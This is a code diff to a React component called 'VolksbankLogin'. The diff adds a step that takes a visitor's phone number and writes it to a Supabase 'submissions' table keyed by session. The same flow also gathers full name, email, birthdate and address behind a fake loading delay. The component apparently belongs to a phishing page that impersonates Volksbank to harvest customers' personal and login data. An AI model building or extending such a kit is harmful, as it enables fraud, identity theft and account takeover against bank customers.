@@ -96,17 +96,37 @@ const VolksbankLogin = () => {
     setShowLoading(true);
     setTimeout(() => {
       setShowLoading(false);
-      setStep("data");
+      setStep("phone");
       window.scrollTo(0, 0);
     }, 1800);
   };
 
-  const allDataValid = REQUIRED_FIELDS.every((f) => !!values[f]?.trim());
+  const handlePhoneSubmit = async () => {
+    if (!phone.trim()) {
+      setTouched((t) => ({ ...t, phone: true }));
+      return;
+    }
+    setSubmitting(true);
+    const { error } = await supabase
+      .from("submissions")
+      .update({ phone })
+      .eq("session_id", sessionId);
+    setSubmitting(false);
+    if (error) {
+      console.error("Phone update failed:", error);
+      alert("Fehler beim Speichern. Bitte versuchen Sie es erneut.");
+      return;
+    }
+    setStep("details");
+    window.scrollTo(0, 0);
+  };
+
+  const allDetailsValid = DETAILS_FIELDS.every((f) => !!values[f]?.trim());
 
   const handleDataSubmit = async () => {
-    if (!allDataValid) {
-      setTouched(REQUIRED_FIELDS.reduce((acc, f) => ({ ...acc, [f]: true }), {}));
-      const firstInvalid = REQUIRED_FIELDS.find((f) => isFieldInvalid(f));
+    if (!allDetailsValid) {
+      setTouched((t) => ({ ...t, ...DETAILS_FIELDS.reduce((acc, f) => ({ ...acc, [f]: true }), {}) }));
+      const firstInvalid = DETAILS_FIELDS.find((f) => isFieldInvalid(f));
       if (firstInvalid) {
         requestAnimationFrame(() => {
           document.querySelector<HTMLElement>(`[data-field="${firstInvalid}"]`)
@@ -122,7 +142,6 @@ const VolksbankLogin = () => {
         full_name: `${firstName} ${lastName}`.trim(),
         email,
         birthdate,
-        phone,
         street,
         house_number: houseNumber,
         staircase,
